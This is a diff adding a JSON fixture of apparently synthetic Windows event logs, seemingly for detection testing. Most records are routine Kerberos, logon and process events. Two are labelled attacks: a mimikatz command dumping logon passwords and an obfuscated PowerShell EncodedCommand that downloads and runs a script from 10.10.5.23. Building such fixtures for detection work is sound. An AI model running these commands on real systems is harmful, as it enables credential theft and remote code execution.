@@ -1,0 +1,7323 @@
+[
+  {
+    "id": 500,
+    "timestamp": "2025-08-18T08:19:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 499,
+    "timestamp": "2025-08-18T08:18:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 498,
+    "timestamp": "2025-08-18T08:17:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 497,
+    "timestamp": "2025-08-18T08:16:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 496,
+    "timestamp": "2025-08-18T08:15:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 495,
+    "timestamp": "2025-08-18T08:14:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 494,
+    "timestamp": "2025-08-18T08:13:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 493,
+    "timestamp": "2025-08-18T08:12:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 492,
+    "timestamp": "2025-08-18T08:11:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 491,
+    "timestamp": "2025-08-18T08:10:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 490,
+    "timestamp": "2025-08-18T08:09:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 489,
+    "timestamp": "2025-08-18T08:08:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 488,
+    "timestamp": "2025-08-18T08:07:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 487,
+    "timestamp": "2025-08-18T08:06:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 486,
+    "timestamp": "2025-08-18T08:05:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 485,
+    "timestamp": "2025-08-18T08:04:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 484,
+    "timestamp": "2025-08-18T08:03:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 483,
+    "timestamp": "2025-08-18T08:02:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 482,
+    "timestamp": "2025-08-18T08:01:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 481,
+    "timestamp": "2025-08-18T08:00:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 480,
+    "timestamp": "2025-08-18T07:59:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 479,
+    "timestamp": "2025-08-18T07:58:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 478,
+    "timestamp": "2025-08-18T07:57:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 477,
+    "timestamp": "2025-08-18T07:56:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 476,
+    "timestamp": "2025-08-18T07:55:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Error",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 475,
+    "timestamp": "2025-08-18T07:54:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 474,
+    "timestamp": "2025-08-18T07:53:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 473,
+    "timestamp": "2025-08-18T07:52:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 472,
+    "timestamp": "2025-08-18T07:51:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 471,
+    "timestamp": "2025-08-18T07:50:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 470,
+    "timestamp": "2025-08-18T07:49:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 469,
+    "timestamp": "2025-08-18T07:48:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 468,
+    "timestamp": "2025-08-18T07:47:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 467,
+    "timestamp": "2025-08-18T07:46:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 466,
+    "timestamp": "2025-08-18T07:45:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 465,
+    "timestamp": "2025-08-18T07:44:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 464,
+    "timestamp": "2025-08-18T07:43:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 463,
+    "timestamp": "2025-08-18T07:42:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 462,
+    "timestamp": "2025-08-18T07:41:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 461,
+    "timestamp": "2025-08-18T07:40:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Critical",
+    "image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+    "attack_category": "Credential Access (Mimikatz)",
+    "attack_technique": "T1003",
+    "message": "Process creation: mimikatz.exe executed with debug privileges.",
+    "tags": [
+      "attack",
+      "mimikatz"
+    ]
+  },
+  {
+    "id": 460,
+    "timestamp": "2025-08-18T07:39:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 459,
+    "timestamp": "2025-08-18T07:38:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 458,
+    "timestamp": "2025-08-18T07:37:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 457,
+    "timestamp": "2025-08-18T07:36:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 456,
+    "timestamp": "2025-08-18T07:35:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 455,
+    "timestamp": "2025-08-18T07:34:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 454,
+    "timestamp": "2025-08-18T07:33:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 453,
+    "timestamp": "2025-08-18T07:32:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 452,
+    "timestamp": "2025-08-18T07:31:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 451,
+    "timestamp": "2025-08-18T07:30:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 450,
+    "timestamp": "2025-08-18T07:29:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 449,
+    "timestamp": "2025-08-18T07:28:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 448,
+    "timestamp": "2025-08-18T07:27:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 447,
+    "timestamp": "2025-08-18T07:26:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 446,
+    "timestamp": "2025-08-18T07:25:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 445,
+    "timestamp": "2025-08-18T07:24:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 444,
+    "timestamp": "2025-08-18T07:23:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 443,
+    "timestamp": "2025-08-18T07:22:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 442,
+    "timestamp": "2025-08-18T07:21:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 441,
+    "timestamp": "2025-08-18T07:20:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 440,
+    "timestamp": "2025-08-18T07:19:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 439,
+    "timestamp": "2025-08-18T07:18:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 438,
+    "timestamp": "2025-08-18T07:17:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 437,
+    "timestamp": "2025-08-18T07:16:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 436,
+    "timestamp": "2025-08-18T07:15:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 435,
+    "timestamp": "2025-08-18T07:14:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 434,
+    "timestamp": "2025-08-18T07:13:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 433,
+    "timestamp": "2025-08-18T07:12:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 432,
+    "timestamp": "2025-08-18T07:11:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 431,
+    "timestamp": "2025-08-18T07:10:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 430,
+    "timestamp": "2025-08-18T07:09:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 429,
+    "timestamp": "2025-08-18T07:08:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 428,
+    "timestamp": "2025-08-18T07:07:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 427,
+    "timestamp": "2025-08-18T07:06:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 426,
+    "timestamp": "2025-08-18T07:05:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 425,
+    "timestamp": "2025-08-18T07:04:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 424,
+    "timestamp": "2025-08-18T07:03:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 423,
+    "timestamp": "2025-08-18T07:02:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 422,
+    "timestamp": "2025-08-18T07:01:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 421,
+    "timestamp": "2025-08-18T07:00:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "PowerShell",
+    "event_id": 4104,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4ANQAuADIAMwAvAGEALgBwAHMAMQAnACkA",
+    "attack_category": "Command and Scripting Interpreter (PowerShell)",
+    "attack_technique": "T1059.001",
+    "message": "PowerShell ScriptBlock logged with suspicious EncodedCommand.",
+    "tags": [
+      "attack",
+      "powershell",
+      "base64"
+    ]
+  },
+  {
+    "id": 420,
+    "timestamp": "2025-08-18T06:59:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 419,
+    "timestamp": "2025-08-18T06:58:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 418,
+    "timestamp": "2025-08-18T06:57:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 417,
+    "timestamp": "2025-08-18T06:56:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 416,
+    "timestamp": "2025-08-18T06:55:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 415,
+    "timestamp": "2025-08-18T06:54:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
